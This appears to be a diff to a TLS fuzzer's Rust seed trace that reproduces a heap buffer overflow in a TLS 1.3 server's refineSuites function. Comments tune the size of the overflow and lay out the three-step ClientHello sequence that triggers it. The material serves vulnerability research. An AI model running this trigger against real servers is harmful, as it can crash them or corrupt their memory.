@@ -2436,8 +2436,13 @@ pub fn seed_session_resumption_dhe_full(
 pub fn seed_finding_11(initial_server: AgentName, server: AgentName) -> Trace<TlsQueryMatcher> {
     let mut cipher_suites = term! { fn_new_cipher_suites() };
 
-    for _ in 0..100 {
-        // 200 is too large already
+    for _ in 0..12 {  // also works with 149, 150 leads a too large list of suites (as expected)
+        // Maximum reached suitesSz value depending on the number of ciphers in the list:
+        // 149 -> suiteSz reaches >29461 (overflow of > 29161 bytes)
+        // 14 -> suiteSz reaches 450 (overflow of 150 bytes)
+        // 13 -> suiteSz reaches 392  (overflow of 92 bytes)
+        // 12 -> suiteSz reaches 338  (overflow of 38 bytes)
+        // 11 -> suiteSz remains below 300
         cipher_suites = term! {
             fn_append_cipher_suite(
                 (@cipher_suites),
@@ -2469,7 +2474,8 @@ pub fn seed_finding_11(initial_server: AgentName, server: AgentName) -> Trace<Tl
             fn_new_session_id,
             (fn_append_cipher_suite(
                  (@cipher_suites), // CHANGED FROM: (fn_new_cipher_suites()),
-                fn_cipher_suite13_aes_128_gcm_sha256
+                // CHANGED FROM fn_cipher_suite13_aes_128_gcm_sha256
+                fn_cipher_suite13_aes_256_gcm_sha384
             )),
             fn_compressions,
             (fn_client_extensions_append(
@@ -2482,6 +2488,7 @@ pub fn seed_finding_11(initial_server: AgentName, server: AgentName) -> Trace<Tl
                                 // CHANGED from:     fn_client_extensions_new,
                                 // CHANGED from:     (fn_support_group_extension(fn_named_group_secp384r1))
                                 // CHANGED from: )),
+                                // ^ lacks of the above makes the server enter a `SERVER_HELLO_RETRY_REQUEST_COMPLETE` state
                                 fn_signature_algorithm_extension
                             )),
                             fn_supported_versions13_extension
@@ -2492,6 +2499,7 @@ pub fn seed_finding_11(initial_server: AgentName, server: AgentName) -> Trace<Tl
                 )),
                 // https://datatracker.ietf.org/doc/html/rfc8446#section-2.2
                 // must be last in client_hello, and initially empty until filled by fn_fill_binder
+                // this will be filled by the binder below with psk defined below
                 (fn_preshared_keys_extension_empty_binder(
                     (fn_new_session_ticket13(
                         fn_empty_bytes_vec,
@@ -2525,7 +2533,7 @@ pub fn seed_finding_11(initial_server: AgentName, server: AgentName) -> Trace<Tl
 
     let binder = term! {
         fn_derive_binder(
-            (@initial_client_hello), // CHANGED: (@client_hello),
+            (@initial_client_hello), // CHANGED: (@client_hello), // This is the previous message bound to this PSK
             (@psk)
         )
     };
@@ -2537,10 +2545,16 @@ pub fn seed_finding_11(initial_server: AgentName, server: AgentName) -> Trace<Tl
         )
     };
 
+
     let trace = Trace {
+        // Step 1: Prior trace performs an initial TLS 1.3 session with a full handshake and
+        // establishes a PSK, including Client Hello number 1 (`CH1`).
         prior_traces: vec![initial_handshake],
         descriptors: vec![AgentDescriptor::new_server(server, TLSVersion::V1_3)],
         steps: vec![
+            // Step 2: sends a Client Hello (CH2) with a missing support_group_extension that will make the server
+            // enters the state `SERVER_HELLO_RETRY_REQUEST_COMPLETE` and with PSK resuming previous session.
+            // CH2 includes a list of repeated ciphers that will be stored in ssl->suites->suites.
             Step {
                 agent: server,
                 action: Action::Input(InputAction {
@@ -2549,6 +2563,12 @@ pub fn seed_finding_11(initial_server: AgentName, server: AgentName) -> Trace<Tl
                     },
                 }),
             },
+            // Step 3: sends a Client Hello (CH3) with a missing support_group_extension that will keep the server
+            // in the state `SERVER_HELLO_RETRY_REQUEST_COMPLETE` and with PSK resuming previous session.
+            // CH3 includes a list of repeated ciphers that will be matched against ssl->suites->suites.
+            // Since ssl->suites->suites already contain repeated ciphers, the function refineSuites in tls13.c
+            // will wrongly consider all pairs leading to an explosion of sizeSz and the buffer overflow.
+            // Note: CH3 could also include support_group_extension.
             Step {
                 agent: server,
                 action: Action::Input(InputAction {
